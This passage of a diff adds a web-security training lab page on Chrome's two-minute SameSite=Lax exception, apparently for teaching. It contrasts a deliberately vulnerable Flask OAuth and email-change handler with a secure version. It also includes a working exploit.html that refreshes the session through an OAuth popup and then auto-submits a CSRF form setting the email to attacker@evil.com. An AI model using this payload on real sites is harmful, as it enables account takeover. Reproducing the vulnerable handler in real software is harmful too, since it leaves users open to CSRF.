+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        Chrome has a 2-minute exception for SameSite=Lax: newly set cookies are treated as SameSite=None
+                        for top-level POST requests within 2 minutes. This allows CSRF if attacker can trigger cookie refresh.
+                    </p>
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Chrome's 2-minute Lax exception for POST requests</li>
+                        <li>Newly issued cookies bypass SameSite=Lax for 120 seconds</li>
+                        <li>OAuth flows often refresh session cookies automatically</li>
+                        <li>Attacker triggers OAuth login, then CSRF within 2 minutes</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab12"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab12"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab12-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>oauth_handler.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># OAuth callback sets new session cookie
+@app.route('/oauth-callback')
+def oauth_callback():
+    code = request.args.get('code')
+    token = exchange_code_for_token(code)
+    user = get_user_from_token(token)
+
+<span class="vuln-line">    # ❌ New session cookie issued - starts 2-minute Lax exception!</span>
+<span class="vuln-line">    response = make_response(redirect('/my-account'))</span>
+<span class="vuln-line">    response.set_cookie('session', generate_session(user), samesite='Lax')</span>
+    return response
+
+@app.route('/my-account/change-email', methods=['POST'])
+def change_email():
+    # No CSRF token, relying solely on SameSite=Lax
+    # Vulnerable within 2 minutes of cookie refresh!
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="vuln-line"># Chrome's 2-minute exception:</span>
+<span class="vuln-line"># Cookies set within last 2 minutes are sent with</span>
+<span class="vuln-line"># cross-site top-level POST requests</span>
+<span class="vuln-line"># This was added for compatibility with OAuth flows</span></code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab12-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>oauth_handler.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line"># ✅ Always use CSRF tokens - don't rely only on SameSite</span>
+@app.route('/oauth-callback')
+def oauth_callback():
+    code = request.args.get('code')
+    token = exchange_code_for_token(code)
+    user = get_user_from_token(token)
+
+    response = make_response(redirect('/my-account'))
+<span class="secure-line">    # Use SameSite=Strict for maximum protection</span>
+<span class="secure-line">    response.set_cookie('session', generate_session(user), samesite='Strict')</span>
+    return response
+
+@app.route('/my-account/change-email', methods=['POST'])
+def change_email():
+<span class="secure-line">    # ✅ CSRF token required even with SameSite cookies</span>
+<span class="secure-line">    validate_csrf_token(request.form.get('csrf'))</span>
+
+    new_email = request.form.get('email')
+    current_user.email = new_email
+    return redirect('/my-account')
+
+<span class="secure-line"># ✅ Key protections:</span>
+<span class="secure-line"># 1. Use SameSite=Strict instead of Lax</span>
+<span class="secure-line"># 2. Always validate CSRF tokens</span>
+<span class="secure-line"># 3. Don't rely solely on browser protections</span>
+<span class="secure-line"># 4. The 2-minute exception doesn't affect Strict</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Trigger OAuth refresh + CSRF within 2 minutes (exploit.html)</span>
+&lt;html&gt;
+&lt;body&gt;
+    &lt;!-- Step 1: Open OAuth in popup to refresh victim's session cookie --&gt;
+    &lt;script&gt;
+        // Open OAuth login in popup - this refreshes session cookie
+        var popup = window.open('https://vulnerable-website.com/social-login', '_blank');
+
+        // Wait for OAuth to complete, then execute CSRF
+        setTimeout(function() {
+            popup.close();
+
+            // Step 2: CSRF within 2-minute window
+            // Cookie was just issued, so Lax exception applies!
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://vulnerable-website.com/my-account/change-email';
+
+            var email = document.createElement('input');
+            email.type = 'hidden';
+            email.name = 'email';
+            email.value = 'attacker@evil.com';
+            form.appendChild(email);
+
+            document.body.appendChild(form);
+            form.submit();
+        }, 5000); // Wait 5 seconds for OAuth
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;!-- Attack flow:
+     1. Popup triggers OAuth login (refreshes session cookie)
+     2. Wait for OAuth to complete (cookie is now &lt;2 minutes old)
+     3. CSRF POST with cookie (2-minute Lax exception applies)
+     4. Attack succeeds! --&gt;
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+    <script>
+        // Handle code tab clicks
+        document.querySelectorAll('.code-tab').forEach(tab => {
+            tab.addEventListener('click', function(e) {
+                e.preventDefault();
+                const section = this.closest('.code-review-section');
+                const view = this.dataset.view;
+                const labId = this.dataset.lab;
+
+                section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+
+                const vulnEl = document.getElementById(`${labId}-vulnerable`);
+                const secureEl = document.getElementById(`${labId}-secure`);
+
+                if (vulnEl && secureEl) {
+                    if (view === 'vulnerable') {
+                        vulnEl.classList.remove('hidden');
+                        secureEl.classList.add('hidden');
+                    } else {
+                        vulnEl.classList.add('hidden');
+                        secureEl.classList.remove('hidden');
+                    }
+                }
+            });
+        });
+
+        // Lab sidebar navigation
+        document.querySelectorAll('.lab-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+
+                const labId = item.dataset.lab;
+                document.querySelectorAll('.lab-content').forEach(content => {
+                    content.classList.add('hidden');
+                });
+
+                const labContent = document.getElementById(labId);
+                if (labContent) {
+                    labContent.classList.remove('hidden');
+                }
+            });
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            const firstLab = document.querySelector('.lab-item');
+            if (firstLab) firstLab.click();
+        });
+    </script>
+</body>
+</html>
